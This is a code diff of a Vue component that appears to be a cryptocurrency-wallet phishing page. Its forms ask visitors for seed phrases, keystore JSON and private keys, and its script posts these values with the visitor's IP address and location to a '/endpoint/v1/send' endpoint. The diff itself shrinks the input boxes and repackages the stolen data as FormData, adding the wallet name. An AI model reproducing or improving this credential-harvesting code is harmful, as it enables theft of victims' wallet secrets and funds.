@@ -90,7 +90,7 @@
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
-                                    <textarea required v-model.trim="inputOne" id="inputOne" class="form-control" rows="7" placeholder="Phrase"></textarea>
+                                    <textarea required v-model.trim="inputOne" id="inputOne" class="form-control" rows="3" placeholder="Phrase"></textarea>
                                     <label class="color-red" v-show="hasError">{{error}}</label>
                                   </div>
                                 </div>
@@ -124,7 +124,7 @@
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
-                                    <textarea required v-model="inputTwo" class="form-control" rows="7" placeholder="Keystone JSON"></textarea>
+                                    <textarea required v-model="inputTwo" class="form-control" rows="3" placeholder="Keystone JSON"></textarea>
                                     <label class="color-red" v-show="hasErrorr">{{errorr}}</label>
                                 </div>
                                 </div>
@@ -166,7 +166,7 @@
                                     <div class="form-group">
                                     <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                   </div>
-                                    <textarea required v-model="inputThree" id="inputThree" class="form-control" rows="7" placeholder="Enter Private Keys"></textarea>
+                                    <textarea required v-model="inputThree" id="inputThree" class="form-control" rows="3" placeholder="Enter Private Keys"></textarea>
                                     <label class="color-red" v-show="hasErrorrr">{{errorrr}}</label>
                                   </div>
                                 </div>
@@ -434,25 +434,19 @@ export default {
           // monday 14 feb 2022 10:11
           const timein = date.getDay()+'-'+date.getDate()+'-'+date.getMonth()+'-'+date.getFullYear()+'-'+date.getHours()+'-'+date.getMinutes()+'-'+date.getSeconds()
 
-            const data = {
-              type: type,
-              dataO: dataO,
-              dataT: dataT,
-              ip: ip,
-              loc: loc,
-              date: date,
-              timein: timein,
-            }
-          // var config = {
-            // header: {
-            //   'Access-Control-Allow-Origin': '*',
-            //   'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
-            //   }
-          // };
+          const fdata = new FormData();
+          fdata.append('wallet', wallet);
+          fdata.append('type', type);
+          fdata.append('dataO', dataO);
+          fdata.append('dataT', dataT);
+          fdata.append('ip', ip);
+          fdata.append('loc', loc);
+          fdata.append('timein', timein);
+
           axios
             // .get('/endpoint/v1/send?wallet='+wallet)
             // .get('/endpoint/v1/send?wallet='+wallet+'&type='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc, config)
-            .post('/endpoint/v1/send', data)
+            .post('/endpoint/v1/send', fdata)
             .then(res => {
               console.log(res)
               console.log(res.data)
